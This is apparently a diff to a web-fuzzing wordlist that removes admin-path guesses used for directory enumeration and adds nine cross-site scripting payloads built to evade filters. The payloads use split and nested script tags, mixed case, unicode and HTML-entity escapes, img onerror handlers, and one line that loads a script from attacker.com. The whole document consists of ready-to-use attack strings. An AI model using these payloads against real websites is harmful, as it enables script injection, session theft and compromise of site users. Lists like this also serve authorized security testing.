@@ -1,6 +1,9 @@
-admin
-admin1
-admin_
-admin.php
-admin.bak
-admin.old
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1)<<</script>/script>
+<scRiPt>alert(1)</sCriPt>
+< script >alert(1)< /script >
+<script/src=//attacker.com/xss.js>
+<script>/**/alert(1)</script>
+<script>al\u0065rt(1)</script>
+<img src=x onerror="\u0061lert(1)">
+<img src=x onerror="&#97;lert(1)">
